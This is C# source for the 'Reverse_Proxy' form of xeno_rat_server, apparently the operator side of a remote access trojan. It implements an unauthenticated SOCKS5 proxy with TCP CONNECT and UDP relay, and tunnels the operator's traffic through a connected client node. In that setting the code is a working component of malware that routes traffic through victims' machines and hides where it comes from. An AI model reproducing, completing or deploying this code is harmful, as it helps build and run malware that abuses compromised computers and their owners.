using dnlib.DotNet.Emit;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class Reverse_Proxy : Form
    {
        Node client;
        private CancellationTokenSource _acceptCts;
        private X509Certificate2 serverCertificate;
        private Socket listenerSocket;
        private List<Node> activeSubnodes = new List<Node>();

        private Task _acceptLoopTask;

        public Reverse_Proxy(Node _client, X509Certificate2 certificate = null)
        {
            InitializeComponent();
            client = _client;
            client.AddTempOnDisconnect(OnClientDisconnect);
            serverCertificate = certificate; // optional, required for TLS
        }

        private void OnClientDisconnect(Node node)
        {
            foreach (var n in activeSubnodes) n?.Disconnect();
            activeSubnodes.Clear();
            listenerSocket?.Close();
        }

        private async Task AcceptLoop(int port, CancellationToken token)
        {
            listenerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            listenerSocket.Bind(new IPEndPoint(IPAddress.Any, port));
            listenerSocket.Listen(100);

            while (!token.IsCancellationRequested)
            {
                try
                {
                    var clientSock = await listenerSocket.AcceptAsync();
                    _ = Task.Run(() => HandleClientSock(clientSock, token));
                }
                catch (ObjectDisposedException)
                {
                    // Expected when stopping the listener
                    break;
                }
                catch (SocketException)
                {
                    // Likely listener closed
                    break;
                }
                catch (Exception ex)
                {
                    Console.WriteLine("AcceptLoop error: " + ex.Message);
                }
            }
        }


        private async Task HandleClientSock(Socket clientSock, CancellationToken token)
        {
            try
            {
                // Start SOCKS5 negotiation
                if (!await StartNegotiation(clientSock)) return;

                // Handle CONNECT command
                await HandleConnect(clientSock);
            }
            catch { clientSock.Close(); }
        }

        private async Task HandleConnect(Socket clientSock)
        {
            try
            {
                // Receive first 4 bytes: VER, CMD, RSV, ATYP
                byte[] header = await RecvAll(clientSock, 4);
                if (header == null || header.Length < 4)
                {
                    clientSock.Close();
                    return;
                }

                byte ver = header[0];
                byte cmd = header[1];
                byte rsv = header[2];
                byte addrType = header[3];

                if (ver != 5)
                {
                    await SendSocksReply(clientSock, 1); // General SOCKS failure
                    clientSock.Close();
                    return;
                }

                if (cmd != 1) // Only CONNECT
                {
                    await SendSocksReply(clientSock, 7); // Command not supported
                    clientSock.Close();
                    return;
                }

                string destAddr = "";
                if (addrType == 1) // IPv4
                {
                    byte[] ipBytes = await RecvAll(clientSock, 4);
                    if (ipBytes == null) { clientSock.Close(); return; }
                    destAddr = string.Join(".", ipBytes);
                }
                else if (addrType == 3) // Domain name
                {
                    byte[] lenBuf = await RecvAll(clientSock, 1);
                    if (lenBuf == null) { clientSock.Close(); return; }
                    int len = lenBuf[0];

                    byte[] domainBytes = await RecvAll(clientSock, len);
                    if (domainBytes == null) { clientSock.Close(); return; }
                    destAddr = Encoding.ASCII.GetString(domainBytes);
                }
                else if (addrType == 4) // IPv6
                {
                    byte[] ipBytes = await RecvAll(clientSock, 16);
                    if (ipBytes == null) { clientSock.Close(); return; }
                    destAddr = new IPAddress(ipBytes).ToString();
                }
                else
                {
                    await SendSocksReply(clientSock, 8); // Address type not supported
                    clientSock.Close();
                    return;
                }

                // Read destination port (2 bytes)
                byte[] portBytes = await RecvAll(clientSock, 2);
                if (portBytes == null) { clientSock.Close(); return; }
                int destPort = (portBytes[0] << 8) | portBytes[1];

                // Connect to the remote destination
                TcpClient remoteClient = new TcpClient();
                try
                {
                    await remoteClient.ConnectAsync(destAddr, destPort);
                }
                catch
                {
                    await SendSocksReply(clientSock, 5); // Connection refused
                    clientSock.Close();
                    return;
                }

                // Send success reply to client
                await SendSocksReply(clientSock, 0);

                // Create and add ListView item
                ListViewItem lvi = new ListViewItem($"{destAddr}:{destPort}");
                listView1?.BeginInvoke((MethodInvoker)(() => {
                    listView1.Items.Add(lvi);
                    listView1.AutoResizeColumn(0, ColumnHeaderAutoResizeStyle.ColumnContent);
                    if (listView1.Items.Count > 0)
                    {
                        listView1.EnsureVisible(listView1.Items.Count - 1);
                    }
                }));

                // Start bidirectional relay
                _ = Task.Run(() => RelayLoop(clientSock, remoteClient, lvi));

            }
            catch
            {
                clientSock.Close();
            }
        }

        private async Task<bool> StartNegotiation(Socket clientSock)
        {
            byte[] version = await RecvAll(clientSock, 1);
            if (version == null || version[0] != 5) return false;

            byte[] nMethods = await RecvAll(clientSock, 1);
            if (nMethods == null) return false;

            byte[] methods = await RecvAll(clientSock, nMethods[0]);
            if (methods == null) return false;

            // Only no-auth
            await clientSock.SendAsync(new ArraySegment<byte>(new byte[] { 5, 0 }), SocketFlags.None);
            return true;
        }

        public async Task SendAsync(Socket sock, byte[] data)
        {
            if (sock == null || !sock.Connected) return;

            try
            {
                // Prefix with 4-byte length (network byte order)
                byte[] lengthPrefix = BitConverter.GetBytes(data.Length);
                if (BitConverter.IsLittleEndian)
                    Array.Reverse(lengthPrefix); // network byte order

                byte[] sendBuffer = new byte[lengthPrefix.Length + data.Length];
                Array.Copy(lengthPrefix, 0, sendBuffer, 0, lengthPrefix.Length);
                Array.Copy(data, 0, sendBuffer, lengthPrefix.Length, data.Length);

                int totalSent = 0;
                while (totalSent < sendBuffer.Length)
                {
                    int sent = await sock.SendAsync(
                        new ArraySegment<byte>(sendBuffer, totalSent, sendBuffer.Length - totalSent),
                        SocketFlags.None
                    );
                    if (sent == 0) throw new SocketException();
                    totalSent += sent;
                }

                Console.WriteLine($"[SendAsync] Sent {data.Length} bytes (total with header: {sendBuffer.Length})");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[SendAsync] Exception: {ex}");
                sock.Close();
            }
        }

        private async Task RelayLoop(Socket clientSock, TcpClient remoteClient, ListViewItem lvi)
        {
            var clientStream = new NetworkStream(clientSock, true);
            var remoteStream = remoteClient.GetStream();

            var buffer = new byte[4096];

            try
            {
                while (clientSock.Connected && remoteClient.Connected)
                {
                    // Read from client
                    if (clientSock.Available > 0)
                    {
                        int read = await clientStream.ReadAsync(buffer, 0, buffer.Length);
                        if (read == 0) break;
                        await remoteStream.WriteAsync(buffer, 0, read);
                    }

                    // Read from remote
                    if (remoteClient.Available > 0)
                    {
                        int read = await remoteStream.ReadAsync(buffer, 0, buffer.Length);
                        if (read == 0) break;
                        await clientStream.WriteAsync(buffer, 0, read);
                    }

                    await Task.Delay(10);
                }
            }
            catch { }
            finally
            {
                clientSock.Close();
                remoteClient.Close();

                // Remove the ListView item safely
                if (lvi != null)
                    listView1?.BeginInvoke((MethodInvoker)(() => lvi.Remove()));
            }
        }

        private async Task SendSocksReply(Socket sock, byte replyCode)
        {
            byte[] reply = { 5, replyCode, 0, 1, 0, 0, 0, 0, 0, 0 };
            await sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None);
        }

        private async Task<byte[]> RecvAll(Socket sock, int size)
        {
            byte[] data = new byte[size];
            int received = 0;
            while (received < size)
            {
                int r = await sock.ReceiveAsync(new ArraySegment<byte>(data, received, size - received), SocketFlags.None);
                if (r == 0) return null;
                received += r;
            }
            return data;
        }

        private async Task HandleUdpAssociate(Socket client_sock)
        {
            var udpSock = new UdpClient(0); // bind to any free UDP port
            var localEP = (IPEndPoint)udpSock.Client.LocalEndPoint;

            // SOCKS5 success reply
            byte[] reply = new byte[10];
            reply[0] = 0x05;
            reply[1] = 0x00;
            reply[2] = 0x00;
            reply[3] = Socks5Const.AddressType.IPv4;
            Array.Copy(localEP.Address.GetAddressBytes(), 0, reply, 4, 4);
            ushort port = (ushort)localEP.Port;
            byte[] portBytes = BitConverter.GetBytes(port);
            if (BitConverter.IsLittleEndian) Array.Reverse(portBytes);
            Array.Copy(portBytes, 0, reply, 8, 2);
            await client_sock.SendAsync(new ArraySegment<byte>(reply), SocketFlags.None);

            var cts = new CancellationTokenSource();
            bool disposed = false;

            // Background UDP relay loop
            var udpLoop = Task.Run(async () =>
            {
                try
                {
                    while (!cts.Token.IsCancellationRequested)
                    {
                        if (disposed || udpSock.Client == null)
                            break;

                        UdpReceiveResult result;
                        try
                        {
                            var recvTask = udpSock.ReceiveAsync();
                            var completed = await Task.WhenAny(recvTask, Task.Delay(1000, cts.Token));
                            if (completed != recvTask)
                                continue;
                            result = recvTask.Result;
                        }
                        catch (ObjectDisposedException) { break; }
                        catch (OperationCanceledException) { break; }
                        catch { continue; }

                        var src = result.RemoteEndPoint;
                        var data = result.Buffer;

                        if (data.Length < 10) continue;

                        try
                        {
                            int addrType = data[3];
                            string destHost = null;
                            int headerLen = 0;

                            if (addrType == Socks5Const.AddressType.IPv4)
                            {
                                destHost = new IPAddress(data.Skip(4).Take(4).ToArray()).ToString();
                                headerLen = 4 + 4 + 2;
                            }
                            else if (addrType == Socks5Const.AddressType.DomainName)
                            {
                                int len = data[4];
                                destHost = Encoding.UTF8.GetString(data, 5, len);
                                headerLen = 4 + 1 + len + 2;
                            }
                            else continue;

                            byte[] dstPortBytes = data.Skip(headerLen - 2).Take(2).ToArray();
                            if (BitConverter.IsLittleEndian) Array.Reverse(dstPortBytes);
                            int destPort = BitConverter.ToUInt16(dstPortBytes, 0);

                            byte[] payload = data.Skip(headerLen).ToArray();

                            using (var remoteUdp = new UdpClient())
                            {
                                try
                                {
                                    await remoteUdp.SendAsync(payload, payload.Length, destHost, destPort);
                                    var resp = await remoteUdp.ReceiveAsync();

                                    byte[] respAddr = IPAddress.Parse(destHost).GetAddressBytes();
                                    byte[] respPort = BitConverter.GetBytes((ushort)destPort);
                                    if (BitConverter.IsLittleEndian) Array.Reverse(respPort);

                                    byte[] sendBack = new byte[10 + resp.Buffer.Length];
                                    sendBack[0] = 0x00;
                                    sendBack[1] = 0x00;
                                    sendBack[2] = 0x00;
                                    sendBack[3] = Socks5Const.AddressType.IPv4;
                                    Array.Copy(respAddr, 0, sendBack, 4, 4);
                                    Array.Copy(respPort, 0, sendBack, 8, 2);
                                    Array.Copy(resp.Buffer, 0, sendBack, 10, resp.Buffer.Length);

                                    if (!disposed && udpSock.Client != null)
                                        await udpSock.SendAsync(sendBack, sendBack.Length, src);
                                }
                                catch (ObjectDisposedException) { break; }
                                catch (SocketException) { continue; }
                                catch { continue; }
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("UDP associate loop inner error: " + ex.Message);
                            continue;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("UDP associate loop error: " + ex.Message);
                }
            }, cts.Token);

            // Keep control socket alive
            var buf = new byte[1];
            try { await client_sock.ReceiveAsync(new ArraySegment<byte>(buf), SocketFlags.None); }
            catch { }

            // Signal stop
            cts.Cancel();

            // Allow loop to finish gracefully
            await Task.Delay(200);

            disposed = true;
            udpSock.Close();
            client_sock.Close();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            int port = int.Parse(textBox1.Text);
            _acceptCts = new CancellationTokenSource();
            _acceptLoopTask = AcceptLoop(port, _acceptCts.Token);
            button1.Enabled = false;
            button2.Enabled = true;
        }

        private async void button2_Click(object sender, EventArgs e)
        {
            _acceptCts?.Cancel();
            listenerSocket?.Close();
            if (_acceptLoopTask != null)
            {
                await Task.WhenAny(_acceptLoopTask, Task.Delay(500)); // wait max 0.5s
                _acceptLoopTask = null;
            }
            button1.Enabled = true;
            button2.Enabled = false;
        }

        private void Reverse_Proxy_FormClosing(object sender, FormClosingEventArgs e)
        {
            _acceptCts?.Cancel();
            listenerSocket?.Close();
        }

        private void textBox2_TextChanged(object sender, EventArgs e) { }

        private void Reverse_Proxy_Load(object sender, EventArgs e)
        {
            listView1.GetType().GetProperty("DoubleBuffered", System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.NonPublic).SetValue(listView1, true, null);
        }
    }
    public static class Socks5Const
    {
        public static class AuthMethod
        {
            public static byte NoAuthenticationRequired = 0x00;
            public static byte GSSAPI = 0x01;
            public static byte UsernamePassword = 0x02;
            public static byte NoAcceptableMethods = 0xFF;
            // '\x03' to '\x7F' IANA ASSIGNED
            // '\x80' to '\xFE' RESERVED FOR PRIVATE METHODS
        }

        public static class Command
        {
            public static byte Connect = 0x01;
            public static byte Bind = 0x02;
            public static byte UdpAssociate = 0x03;
        }

        public static class AddressType
        {
            public static byte IPv4 = 0x01;
            public static byte DomainName = 0x03;
            public static byte IPv6 = 0x04;
        }

        public static class Reply
        {
            public static byte OK = 0x00;                       // succeeded
            public static byte Failure = 0x01;                  // general SOCKS server failure
            public static byte NotAllowed = 0x02;               // connection not allowed by ruleset
            public static byte NetworkUnreachable = 0x03;       // Network unreachable
            public static byte HostUnreachable = 0x04;          // Host unreachable
            public static byte ConnectionRefused = 0x05;        // Connection refused
            public static byte TtlExpired = 0x06;               // TTL expired
            public static byte CommandNotSupported = 0x07;      // Command not supported
            public static byte AddressTypeNotSupported = 0x08;   // Address type not supported
        }
    }
}